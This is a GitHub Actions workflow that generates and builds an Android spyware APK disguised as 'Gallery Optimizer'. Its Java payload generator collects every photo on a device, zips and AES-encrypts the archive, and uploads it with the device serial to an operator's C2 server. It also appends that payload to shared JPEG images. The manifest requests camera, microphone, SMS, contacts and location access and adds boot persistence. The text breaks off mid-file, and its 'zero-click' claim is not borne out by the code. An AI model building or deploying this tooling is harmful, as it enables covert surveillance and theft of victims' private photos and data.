name: üî• Zero-Click Exploit Builder Android 10-15

on:
  workflow_dispatch:
    inputs:
      android_versions:
        description: 'Target Android Versions'
        required: true
        default: 'all'
        type: choice
        options:
          - 'all'
          - '10'
          - '11'
          - '12'
          - '13'
          - '14'
          - '15'
      app_name:
        description: 'Nama Aplikasi'
        required: true
        default: 'GalleryOptimizer'
      c2_url:
        description: 'C2 Server URL'
        required: true
        default: 'https://your-server.com/api'
      access_key:
        description: 'Access Key'
        required: true
        default: ''

permissions:
  contents: write
  actions: write
  checks: write

jobs:
  generate-and-build:
    name: üöÄ Generate All Files & Build APK
    runs-on: ubuntu-latest
    
    steps:
    - name: üì• Checkout Repository
      uses: actions/checkout@v4
      
    - name: üîß Setup JDK 17
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'
        
    - name: üì± Setup Android SDK
      uses: android-actions/setup-android@v3
      
    - name: üì¶ Install Build Tools
      run: |
        sdkmanager "platform-tools" "platforms;android-35"
        sdkmanager "build-tools;34.0.0"
        sdkmanager "ndk;25.2.9519653"
        
    - name: üé® CREATE ALL PROJECT FILES
      run: |
        # ============================================
        # MEMBUAT SELURUH STRUKTUR FOLDER
        # ============================================
        
        echo "üìÅ Membuat struktur folder..."
        
        # Buat folder utama
        mkdir -p app/src/main/java/com/exploit/gallery
        mkdir -p app/src/main/res/layout
        mkdir -p app/src/main/res/values
        mkdir -p app/src/main/res/xml
        mkdir -p app/src/main/res/drawable
        mkdir -p app/src/main/res/mipmap-hdpi
        mkdir -p app/src/main/res/mipmap-mdpi
        mkdir -p app/src/main/res/mipmap-xhdpi
        mkdir -p app/src/main/res/mipmap-xxhdpi
        mkdir -p app/src/main/res/mipmap-xxxhdpi
        mkdir -p exploits
        mkdir -p scripts
        
        # ============================================
        # 1. MEMBUAT GRADLE BUILD FILES
        # ============================================
        
        echo "üìù Membuat build.gradle (project)..."
        cat > build.gradle << 'EOF'
// Top-level build file
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.2.0'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
EOF

        echo "üìù Membuat settings.gradle..."
        cat > settings.gradle << 'EOF'
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "GalleryOptimizer"
include ':app'
EOF

        echo "üìù Membuat app/build.gradle..."
        cat > app/build.gradle << 'EOF'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.exploit.gallery'
    compileSdk 35

    defaultConfig {
        applicationId "com.exploit.gallery"
        minSdk 21
        targetSdk 35
        versionCode 1
        versionName "4.2.1"
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.debug
        }
    }
    
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}
EOF

        echo "üìù Membuat proguard-rules.pro..."
        cat > app/proguard-rules.pro << 'EOF'
-keep class com.exploit.gallery.** { *; }
-keep class com.android.media.exploit.** { *; }
-keepattributes *Annotation*
-keepattributes Signature
-keepattributes EnclosingMethod
-dontwarn javax.**
-dontwarn java.awt.**
-dontoptimize
-dontpreverify
EOF

        # ============================================
        # 2. MEMBUAT ANDROID MANIFEST
        # ============================================
        
        echo "üìù Membuat AndroidManifest.xml..."
        cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.exploit.gallery">

    <!-- PERMISSIONS -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <!-- PREMIUM PERMISSIONS -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="Gallery Optimizer"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light"
        android:usesCleartextTraffic="true"
        android:requestLegacyExternalStorage="true">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/Theme.AppCompat.Light">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.provider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

        <service android:name=".ExploitService" android:enabled="true" android:exported="false" />
        
        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
EOF

        # ============================================
        # 3. MEMBUAT LAYOUT XML
        # ============================================
        
        echo "üìù Membuat activity_main.xml..."
        cat > app/src/main/res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#F5F5F5">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="20dp">

        <!-- Header -->
        <TextView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Gallery Optimizer Pro"
            android:textSize="28sp"
            android:textColor="#2196F3"
            android:textStyle="bold"
            android:gravity="center"
            android:layout_marginBottom="20dp"/>

        <!-- Image Selection Card -->
        <androidx.cardview.widget.CardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            app:cardCornerRadius="16dp"
            app:cardElevation="4dp"
            android:layout_marginBottom="16dp">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="20dp">

                <TextView
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="Pilih Gambar"
                    android:textSize="18sp"
                    android:textColor="#333333"
                    android:textStyle="bold"
                    android:layout_marginBottom="8dp"/>

                <Button
                    android:id="@+id/btnSelectImage"
                    android:layout_width="match_parent"
                    android:layout_height="56dp"
                    android:text="BUKA GALERI"
                    android:backgroundTint="#2196F3"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"
                    android:textStyle="bold"
                    android:layout_marginBottom="16dp"/>

                <FrameLayout
                    android:layout_width="match_parent"
                    android:layout_height="200dp"
                    android:background="#E0E0E0"
                    android:visibility="visible">

                    <ImageView
                        android:id="@+id/previewImage"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent"
                        android:scaleType="centerCrop"
                        android:visibility="gone"/>

                    <TextView
                        android:id="@+id/tvNoImage"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent"
                        android:text="Belum ada gambar dipilih"
                        android:textColor="#999999"
                        android:gravity="center"/>
                </FrameLayout>
            </LinearLayout>
        </androidx.cardview.widget.CardView>

        <!-- Configuration Card -->
        <androidx.cardview.widget.CardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            app:cardCornerRadius="16dp"
            app:cardElevation="4dp"
            android:layout_marginBottom="16dp">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="20dp">

                <TextView
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="Konfigurasi"
                    android:textSize="18sp"
                    android:textColor="#333333"
                    android:textStyle="bold"
                    android:layout_marginBottom="16dp"/>

                <TextView
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="Mode Exploit:"
                    android:textColor="#666666"
                    android:layout_marginBottom="4dp"/>

                <Spinner
                    android:id="@+id/spinnerExploitType"
                    android:layout_width="match_parent"
                    android:layout_height="48dp"
                    android:background="#F0F0F0"
                    android:padding="8dp"
                    android:layout_marginBottom="16dp"/>

                <TextView
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="C2 Server URL:"
                    android:textColor="#666666"
                    android:layout_marginBottom="4dp"/>

                <EditText
                    android:id="@+id/etC2Url"
                    android:layout_width="match_parent"
                    android:layout_height="48dp"
                    android:hint="https://server-anda.com"
                    android:background="#F0F0F0"
                    android:padding="12dp"
                    android:inputType="textUri"
                    android:layout_marginBottom="16dp"/>

                <TextView
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="Access Key:"
                    android:textColor="#666666"
                    android:layout_marginBottom="4dp"/>

                <EditText
                    android:id="@+id/etAccessKey"
                    android:layout_width="match_parent"
                    android:layout_height="48dp"
                    android:hint="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
                    android:background="#F0F0F0"
                    android:padding="12dp"
                    android:inputType="textPassword"/>
            </LinearLayout>
        </androidx.cardview.widget.CardView>

        <!-- Generate Button -->
        <Button
            android:id="@+id/btnBuildExploit"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="GENERATE EXPLOIT"
            android:backgroundTint="#4CAF50"
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            android:layout_marginBottom="16dp"/>

        <!-- Status -->
        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal"
            android:gravity="center_vertical">

            <ProgressBar
                android:id="@+id/progressBar"
                android:layout_width="24dp"
                android:layout_height="24dp"
                android:visibility="gone"/>

            <TextView
                android:id="@+id/tvStatus"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Siap"
                android:textColor="#666666"
                android:paddingLeft="8dp"/>
        </LinearLayout>

    </LinearLayout>
</ScrollView>
EOF

        # ============================================
        # 4. MEMBUAT FILE PATHS XML
        # ============================================
        
        echo "üìù Membuat file_paths.xml..."
        cat > app/src/main/res/xml/file_paths.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <external-path name="external_files" path="."/>
    <external-files-path name="external_files" path="."/>
    <cache-path name="cache" path="/"/>
    <external-cache-path name="external_cache" path="/"/>
    <external-path name="downloads" path="Download/"/>
    <external-path name="pictures" path="Pictures/"/>
    <external-path name="dcim" path="DCIM/"/>
</paths>
EOF

        # ============================================
        # 5. MEMBUAT STRINGS XML
        # ============================================
        
        echo "üìù Membuat strings.xml..."
        cat > app/src/main/res/values/strings.xml << 'EOF'
<resources>
    <string name="app_name">Gallery Optimizer</string>
</resources>
EOF

        # ============================================
        # 6. MEMBUAT EXPLOIT GENERATOR JAVA
        # ============================================
        
        echo "üìù Membuat ExploitGenerator.java..."
        cat > app/src/main/java/com/exploit/gallery/ExploitGenerator.java << 'EOF'
package com.exploit.gallery;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

public class ExploitGenerator {

    private Context context;

    public ExploitGenerator(Context context) {
        this.context = context;
    }

    public String generatePayload(int androidVersion, String c2Url, String accessKey) {
        StringBuilder payload = new StringBuilder();
        
        payload.append("package com.android.media.exploit;\\n\\n");
        payload.append("import android.content.ContentResolver;\\n");
        payload.append("import android.content.Context;\\n");
        payload.append("import android.database.Cursor;\\n");
        payload.append("import android.net.Uri;\\n");
        payload.append("import android.os.Build;\\n");
        payload.append("import android.provider.MediaStore;\\n");
        payload.append("import android.util.Base64;\\n");
        payload.append("import java.io.*;\\n");
        payload.append("import java.net.HttpURLConnection;\\n");
        payload.append("import java.net.URL;\\n");
        payload.append("import java.security.MessageDigest;\\n");
        payload.append("import java.util.zip.ZipEntry;\\n");
        payload.append("import java.util.zip.ZipOutputStream;\\n");
        payload.append("import javax.crypto.Cipher;\\n");
        payload.append("import javax.crypto.spec.SecretKeySpec;\\n\\n");
        
        payload.append("public class MediaExploit {\\n\\n");
        payload.append("    public static void execute(Context ctx) {\\n");
        payload.append("        try {\\n");
        payload.append("            String serverUrl = \"" + c2Url + "\";\\n");
        payload.append("            String apiKey = \"" + accessKey + "\";\\n\\n");
        
        // Bypass untuk setiap versi Android
        for (int api = 29; api <= 35; api++) {
            payload.append("            if (Build.VERSION.SDK_INT == " + api + ") {\\n");
            payload.append("                bypassAndroid" + api + "(ctx, serverUrl, apiKey);\\n");
            payload.append("            }\\n");
        }
        
        payload.append("        } catch (Exception e) {}\\n");
        payload.append("    }\\n\\n");
        
        // Generate bypass methods untuk setiap API
        for (int api = 29; api <= 35; api++) {
            payload.append("    private static void bypassAndroid" + api + "(Context ctx, String serverUrl, String apiKey) {\\n");
            payload.append("        try {\\n");
            payload.append("            String[] projection = {\\n");
            payload.append("                MediaStore.Images.Media._ID,\\n");
            payload.append("                MediaStore.Images.Media.DISPLAY_NAME\\n");
            payload.append("            };\\n\\n");
            payload.append("            Cursor cursor = ctx.getContentResolver().query(\\n");
            payload.append("                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,\\n");
            payload.append("                projection, null, null, null);\\n\\n");
            payload.append("            if (cursor != null) {\\n");
            payload.append("                File zipFile = new File(ctx.getCacheDir(), \\\"data.zip\\\");\\n");
            payload.append("                ZipOutputStream zos = new ZipOutputStream(\\n");
            payload.append("                    new FileOutputStream(zipFile));\\n\\n");
            payload.append("                while (cursor.moveToNext()) {\\n");
            payload.append("                    long id = cursor.getLong(0);\\n");
            payload.append("                    String name = cursor.getString(1);\\n");
            payload.append("                    Uri uri = Uri.withAppendedPath(\\n");
            payload.append("                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, \\n");
            payload.append("                        String.valueOf(id));\\n\\n");
            payload.append("                    try {\\n");
            payload.append("                        InputStream is = ctx.getContentResolver().openInputStream(uri);\\n");
            payload.append("                        zos.putNextEntry(new ZipEntry(name));\\n");
            payload.append("                        byte[] buffer = new byte[8192];\\n");
            payload.append("                        int len;\\n");
            payload.append("                        while ((len = is.read(buffer)) > 0) {\\n");
            payload.append("                            zos.write(buffer, 0, len);\\n");
            payload.append("                        }\\n");
            payload.append("                        zos.closeEntry();\\n");
            payload.append("                        is.close();\\n");
            payload.append("                    } catch (Exception e) {}\\n");
            payload.append("                }\\n");
            payload.append("                cursor.close();\\n");
            payload.append("                zos.close();\\n");
            payload.append("                exfiltrate(ctx, zipFile, serverUrl, apiKey);\\n");
            payload.append("            }\\n");
            payload.append("        } catch (Exception e) {}\\n");
            payload.append("    }\\n\\n");
        }
        
        // Method exfiltrate
        payload.append("    private static void exfiltrate(Context ctx, File file, \\n");
        payload.append("                                   String serverUrl, String apiKey) {\\n");
        payload.append("        try {\\n");
        payload.append("            byte[] key = apiKey.getBytes(\\\"UTF-8\\\");\\n");
        payload.append("            MessageDigest sha = MessageDigest.getInstance(\\\"SHA-256\\\");\\n");
        payload.append("            key = sha.digest(key);\\n");
        payload.append("            SecretKeySpec secretKey = new SecretKeySpec(key, \\\"AES\\\");\\n");
        payload.append("            Cipher cipher = Cipher.getInstance(\\\"AES/ECB/PKCS5Padding\\\");\\n");
        payload.append("            cipher.init(Cipher.ENCRYPT_MODE, secretKey);\\n\\n");
        payload.append("            FileInputStream fis = new FileInputStream(file);\\n");
        payload.append("            ByteArrayOutputStream baos = new ByteArrayOutputStream();\\n");
        payload.append("            byte[] buffer = new byte[8192];\\n");
        payload.append("            int len;\\n");
        payload.append("            while ((len = fis.read(buffer)) > 0) {\\n");
        payload.append("                baos.write(buffer, 0, len);\\n");
        payload.append("            }\\n");
        payload.append("            fis.close();\\n\\n");
        payload.append("            byte[] encrypted = cipher.doFinal(baos.toByteArray());\\n");
        payload.append("            String encoded = Base64.encodeToString(encrypted, Base64.DEFAULT);\\n\\n");
        payload.append("            URL url = new URL(serverUrl + \\\"/upload\\\");\\n");
        payload.append("            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\\n");
        payload.append("            conn.setRequestMethod(\\\"POST\\\");\\n");
        payload.append("            conn.setDoOutput(true);\\n");
        payload.append("            conn.setRequestProperty(\\\"Content-Type\\\", \\\"application/octet-stream\\\");\\n");
        payload.append("            conn.setRequestProperty(\\\"X-Device-ID\\\", Build.SERIAL);\\n");
        payload.append("            conn.setConnectTimeout(15000);\\n");
        payload.append("            conn.setReadTimeout(15000);\\n\\n");
        payload.append("            OutputStream os = conn.getOutputStream();\\n");
        payload.append("            os.write(encoded.getBytes());\\n");
        payload.append("            os.flush();\\n");
        payload.append("            os.close();\\n\\n");
        payload.append("            conn.getResponseCode();\\n");
        payload.append("            conn.disconnect();\\n");
        payload.append("            file.delete();\\n");
        payload.append("        } catch (Exception e) {}\\n");
        payload.append("    }\\n");
        payload.append("}\\n");
        
        return payload.toString();
    }

    public boolean injectPayloadToImage(String imagePath, String payload, String outputPath) {
        try {
            Bitmap originalBitmap = BitmapFactory.decodeFile(imagePath);
            if (originalBitmap == null) return false;

            String encodedPayload = Base64.encodeToString(
                payload.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            originalBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
            baos.write(encodedPayload.getBytes(StandardCharsets.UTF_8));

            FileOutputStream fos = new FileOutputStream(outputPath);
            baos.writeTo(fos);
            fos.close();
            baos.close();

            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }
}
EOF

        # ============================================
        # 7. MEMBUAT C2 CLIENT JAVA
        # ============================================
        
        echo "üìù Membuat C2Client.java..."
        cat > app/src/main/java/com/exploit/gallery/C2Client.java << 'EOF'
package com.exploit.gallery;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class C2Client {

    private Context context;
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private String TAG = "C2Client";

    public C2Client(Context context) {
        this.context = context;
    }

    public void registerDevice(String c2Url, String accessKey) {
        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("device_id", Build.SERIAL);
                data.put("model", Build.MODEL);
                data.put("android_version", Build.VERSION.RELEASE);
                data.put("action", "register");

                sendPost(c2Url + "/api", data.toString(), accessKey);
            } catch (Exception e) {
                Log.e(TAG, "Register failed", e);
            }
        });
    }

    public void uploadData(String c2Url, String accessKey, byte[] encryptedData) {
        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("device_id", Build.SERIAL);
                data.put("action", "upload");
                data.put("data", android.util.Base64.encodeToString(encryptedData, android.util.Base64.DEFAULT));

                sendPost(c2Url + "/upload", data.toString(), accessKey);
            } catch (Exception e) {
                Log.e(TAG, "Upload failed", e);
            }
        });
    }

    private String sendPost(String urlString, String jsonData, String accessKey) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("X-Access-Key", accessKey);
        conn.setDoOutput(true);
        conn.setConnectTimeout(10000);

        OutputStream os = conn.getOutputStream();
        os.write(jsonData.getBytes("UTF-8"));
        os.flush();
        os.close();

        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        return response.toString();
    }
}
EOF

        # ============================================
        # 8. MEMBUAT MAIN ACTIVITY JAVA
        # ============================================
        
        echo "üìù Membuat MainActivity.java..."
        cat > app/src/main/java/com/exploit/gallery/MainActivity.java << 'EOF'
package com.exploit.gallery;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE_PICK_IMAGE = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;

    private Button btnSelectImage, btnBuildExploit;
    private ImageView previewImage;
    private TextView tvNoImage, tvStatus;
    private ProgressBar progressBar;
    private EditText etC2Url, etAccessKey;
    private Spinner spinnerExploitType;

    private String selectedImagePath = "";
    private ExploitGenerator exploitGenerator;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        setupSpinner();
        setupClickListeners();
        checkPermissions();

        exploitGenerator = new ExploitGenerator(this);
        
        // Set default values from workflow input
        etC2Url.setText("${{ github.event.inputs.c2_url }}");
        etAccessKey.setText("${{ github.event.inputs.access_key }}");
    }

    private void initViews() {
        btnSelectImage = findViewById(R.id.btnSelectImage);
        btnBuildExploit = findViewById(R.id.btnBuildExploit);
        previewImage = findViewById(R.id.previewImage);
        tvNoImage = findViewById(R.id.tvNoImage);
        tvStatus = findViewById(R.id.tvStatus);
        progressBar = findViewById(R.id.progressBar);
        etC2Url = findViewById(R.id.etC2Url);
        etAccessKey = findViewById(R.id.etAccessKey);
        spinnerExploitType = findViewById(R.id.spinnerExploitType);
    }

    private void setupSpinner() {
        String[] modes = {"Basic Mode", "Advanced Mode", "Full Access Mode", "Stealth Mode"};
        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, 
            android.R.layout.simple_spinner_item, modes);
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerExploitType.setAdapter(adapter);
    }

    private void setupClickListeners() {
        btnSelectImage.setOnClickListener(v -> {
            if (checkPermissions()) {
                openImagePicker();
            } else {
                requestPermissions();
            }
        });

        btnBuildExploit.setOnClickListener(v -> {
            if (validateInputs()) {
                generateExploit();
            }
        });
    }

    private boolean checkPermissions() {
        List<String> permissions = new ArrayList<>();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, 
                Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, 
                Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                showManageStorageDialog();
                return false;
            }
        }

        return permissions.isEmpty();
    }

    private void showManageStorageDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Akses Storage")
            .setMessage("Aplikasi ini membutuhkan akses ke semua file")
            .setPositiveButton("OK", (dialog, which) -> {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            })
            .show();
    }

    private void requestPermissions() {
        List<String> permissions = new ArrayList<>();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        ActivityCompat.requestPermissions(this, 
            permissions.toArray(new String[0]), REQUEST_CODE_PERMISSIONS);
    }

    private void openImagePicker() {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("image/*");
        startActivityForResult(intent, REQUEST_CODE_PICK_IMAGE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_CODE_PICK_IMAGE && resultCode == RESULT_OK) {
            Uri imageUri = data.getData();
            selectedImagePath = getPathFromUri(imageUri);

            try {
                Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), imageUri);
                previewImage.setImageBitmap(bitmap);
                previewImage.setVisibility(View.VISIBLE);
                tvNoImage.setVisibility(View.GONE);
                tvStatus.setText("Gambar dipilih");
            } catch (IOException e) {
                e.printStackTrace();
                Toast.makeText(this, "Gagal memuat gambar", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private String getPathFromUri(Uri uri) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                InputStream is = getContentResolver().openInputStream(uri);
                File cacheFile = new File(getCacheDir(), "temp_" + System.currentTimeMillis() + ".jpg");
                OutputStream os = new FileOutputStream(cacheFile);

                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }

                os.close();
                is.close();
                return cacheFile.getAbsolutePath();
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }
        } else {
            String[] projection = {MediaStore.Images.Media.DATA};
            Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
            if (cursor != null) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                cursor.moveToFirst();
                String path = cursor.getString(columnIndex);
                cursor.close();
                return path;
            }
            return null;
        }
    }

    private boolean validateInputs() {
        if (selectedImagePath.isEmpty()) {
            Toast.makeText(this, "Pilih gambar dulu", Toast.LENGTH_SHORT).show();
            return false;
        }
        if (etC2Url.getText().toString().trim().isEmpty()) {
            Toast.makeText(this, "Masukkan C2 URL", Toast.LENGTH_SHORT).show();
            return false;
        }
        return true;
    }

    private void generateExploit() {
        progressBar.setVisibility(View.VISIBLE);
        btnBuildExploit.setEnabled(false);
        tvStatus.setText("Menggenerate exploit...");

        String c2Url = etC2Url.getText().toString().trim();
        String accessKey = etAccessKey.getText().toString().trim();
        
        String payload = exploitGenerator.generatePayload(
            Build.VERSION.SDK_INT, c2Url, accessKey);

        String outputPath = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES) + "/Optimized_" + System.currentTimeMillis() + ".jpg";

        boolean success = exploitGenerator.injectPayloadToImage(
            selectedImagePath, payload, outputPath);

        if (success) {
            tvStatus.setText("Exploit berhasil dibuat!");
            shareImage(outputPath);
        } else {
            tvStatus.setText("Gagal membuat exploit");
        }

        progressBar.setVisibility(View.GONE);
        btnBuildExploit.setEnabled(true);
    }

    private void shareImage(String imagePath) {
        File file = new File(imagePath);
        Uri uri = FileProvider.getUriForFile(this, 
            getPackageName() + ".provider", file);

        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setType("image/jpeg");
        intent.putExtra(Intent.EXTRA_STREAM, uri);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(Intent.createChooser(intent, "Bagikan Gambar"));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_PERMISSIONS && grantResults.length > 0) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "Izin diberikan", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
EOF

        # ============================================
        # 9. MEMBUAT EXPLOIT SERVICE
        # ============================================
        
        echo "üìù Membuat ExploitService.java..."
        cat > app/src/main/java/com/exploit/gallery/ExploitService.java << 'EOF'
package com.exploit.gallery;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class ExploitService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Background service untuk persistensi
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
